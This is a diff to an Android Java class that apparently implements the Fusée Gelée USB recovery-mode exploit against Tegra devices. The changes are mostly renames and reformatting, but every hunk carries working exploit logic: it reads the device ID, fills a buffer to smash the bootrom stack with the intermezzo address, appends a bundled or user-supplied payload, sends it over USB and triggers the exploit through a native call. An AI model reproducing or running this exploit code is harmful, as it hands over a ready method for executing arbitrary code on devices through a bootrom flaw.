@@ -12,30 +12,27 @@ import android.hardware.usb.UsbEndpoint;
 import android.hardware.usb.UsbInterface;
 import android.hardware.usb.UsbManager;
 
-import java.io.ByteArrayInputStream;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
-import static android.content.Context.MODE_PRIVATE;
-
 public class PrimaryLoader implements USBDevHandler {
-    private static final int RCM_PAYLOAD_ADDR        = 0x40010000;
-    private static final int INTERMEZZO_LOCATION     = 0x4001F000;
-    private static final int PAYLOAD_LOAD_BLOCK      = 0x40020000;
-    private static final int MAX_LENGTH              = 0x30298;
+    private static final int RCM_PAYLOAD_ADDR = 0x40010000;
+    private static final int INTERMEZZO_LOCATION = 0x4001F000;
+    private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
+    private static final int MAX_LENGTH = 0x30298;
 
     // Used to load the 'native-lib' library on startup.
     static {
         System.loadLibrary("native-lib");
     }
 
-    public void handleDevice(Context ctx, UsbDevice device) {
-        Logger.log(ctx, "[+] Launching primary payload!!!");
+    public void handleDevice(Context context, UsbDevice device) {
+        Logger.log(context, "[+] Launching primary payload!!!");
 
-        UsbManager mUsbManager = (UsbManager) ctx.getSystemService(Context.USB_SERVICE);
+        UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
         UsbInterface intf = device.getInterface(0);
         UsbEndpoint endpoint_in = intf.getEndpoint(0);
         UsbEndpoint endpoint_out = intf.getEndpoint(1);
@@ -45,11 +42,12 @@ public class PrimaryLoader implements USBDevHandler {
         /* Step 1: Read device ID */
 
         byte[] deviceID = new byte[16];
-        if ( conn.bulkTransfer(endpoint_in, deviceID, deviceID.length, 999) != deviceID.length ) {
-            Logger.log(ctx, "[-] Failed to read device ID, bailing out :(");
+        if (conn.bulkTransfer(endpoint_in, deviceID, deviceID.length, 999) != deviceID.length) {
+            Logger.log(context, "[-] Failed to read device ID, bailing out :(");
             return;
         }
-        Logger.log(ctx, "[+] Read device ID: " + Utils.bytesToHex(deviceID));
+
+        Logger.log(context, "[+] Read device ID: " + Utils.bytesToHex(deviceID));
 
         /* Step 2: Start building payload */
 
@@ -60,18 +58,18 @@ public class PrimaryLoader implements USBDevHandler {
         payload.put(new byte[676]);
 
         // smash the stack with the address of the intermezzo
-        for (int i=RCM_PAYLOAD_ADDR; i<INTERMEZZO_LOCATION; i += 4) {
+        for (int i = RCM_PAYLOAD_ADDR; i < INTERMEZZO_LOCATION; i += 4) {
             payload.putInt(INTERMEZZO_LOCATION);
         }
 
         byte[] intermezzo;
         try {
-            InputStream intermezzoStream = ctx.getAssets().open("intermezzo.bin");
+            InputStream intermezzoStream = context.getAssets().open("intermezzo.bin");
             intermezzo = new byte[intermezzoStream.available()];
             intermezzoStream.read(intermezzo);
             intermezzoStream.close();
         } catch (IOException e) {
-            Logger.log(ctx, "[-] Failed to read intermezzo: " + e.toString());
+            Logger.log(context, "[-] Failed to read intermezzo: " + e.toString());
             return;
         }
         payload.put(intermezzo);
@@ -81,9 +79,9 @@ public class PrimaryLoader implements USBDevHandler {
 
         // write the actual payload file
         try {
-            payload.put(getPayload(ctx));
+            payload.put(getPayload(context));
         } catch (IOException e) {
-            Logger.log(ctx, "[-] Failed to read payload: " + e.toString());
+            Logger.log(context, "[-] Failed to read payload: " + e.toString());
             return;
         }
 
@@ -93,36 +91,36 @@ public class PrimaryLoader implements USBDevHandler {
         boolean low_buffer = true;
         byte[] chunk = new byte[0x1000];
         int bytes_sent;
-        for (bytes_sent = 0; bytes_sent<unpadded_length || low_buffer; bytes_sent+=0x1000) {
+        for (bytes_sent = 0; bytes_sent < unpadded_length || low_buffer; bytes_sent += 0x1000) {
             payload.get(chunk);
             if (conn.bulkTransfer(endpoint_out, chunk, chunk.length, 999) != chunk.length) {
-                Logger.log(ctx, "[-] Sending payload failed at offset " + Integer.toString(bytes_sent));
+                Logger.log(context, "[-] Sending payload failed at offset " + Integer.toString(bytes_sent));
                 return;
             }
             low_buffer ^= true;
         }
 
-        Logger.log(ctx, "[+] Sent " + Integer.toString(bytes_sent) + " bytes");
+        Logger.log(context, "[+] Sent " + Integer.toString(bytes_sent) + " bytes");
 
         // 0x7000 = STACK_END = high DMA buffer address
-        switch(nativeTriggerExploit(conn.getFileDescriptor(), 0x7000)) {
+        switch (nativeTriggerExploit(conn.getFileDescriptor(), 0x7000)) {
             case 0:
-                Logger.log(ctx, "[+] Exploit triggered!");
+                Logger.log(context, "[+] Exploit triggered!");
                 break;
             case -1:
-                Logger.log(ctx, "[-] SUBMITURB failed :(");
+                Logger.log(context, "[-] SUBMITURB failed :(");
                 break;
             case -2:
-                Logger.log(ctx, "[-] DISCARDURB failed :(");
+                Logger.log(context, "[-] DISCARDURB failed :(");
                 break;
             case -3:
-                Logger.log(ctx, "[-] REAPURB failed :(");
+                Logger.log(context, "[-] REAPURB failed :(");
                 break;
             case -4:
-                Logger.log(ctx, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
+                Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                 break;
             default:
-                Logger.log(ctx, "[-] How did you get here!?");
+                Logger.log(context, "[-] How did you get here!?");
                 return;
         }
 
@@ -130,19 +128,21 @@ public class PrimaryLoader implements USBDevHandler {
         conn.close();
     }
 
-    private byte[] getPayload(Context ctx) throws IOException {
-        SharedPreferences prefs = ctx.getSharedPreferences("config", MODE_PRIVATE | Context.MODE_MULTI_PROCESS);
-        String payload_name = prefs.getString(ctx.getString(R.string.preference_payload_name), null);
+    private byte[] getPayload(Context context) throws IOException {
+        SharedPreferences prefs = context.getSharedPreferences("config", Context.MODE_MULTI_PROCESS);
+        String payload_name = prefs.getString(Constants.PREFERENCES_KEY, null);
         InputStream payload_file;
+
         if (payload_name == null) {
-            Logger.log(ctx, "[*] Opening default payload (fusee.bin)");
-            payload_file = ctx.getAssets().open("fusee.bin");
+            Logger.log(context, "[*] Opening default payload (fusee.bin)");
+            payload_file = context.getAssets().open("fusee.bin");
         } else {
-            Logger.log(ctx, "[*] Opening custom payload (" + payload_name + ")");
-            payload_file = new FileInputStream(ctx.getFilesDir().getPath() + "/payload.bin");
+            Logger.log(context, "[*] Opening custom payload (" + payload_name + ")");
+            payload_file = new FileInputStream(context.getFilesDir().getPath() + "/payload.bin");
         }
+
         byte[] payload_data = new byte[payload_file.available()];
-        Logger.log(ctx, "[+] Read " + Integer.toString(payload_file.read(payload_data)) + " bytes from payload file");
+        Logger.log(context, "[+] Read " + Integer.toString(payload_file.read(payload_data)) + " bytes from payload file");
         payload_file.close();
         return payload_data;
     }
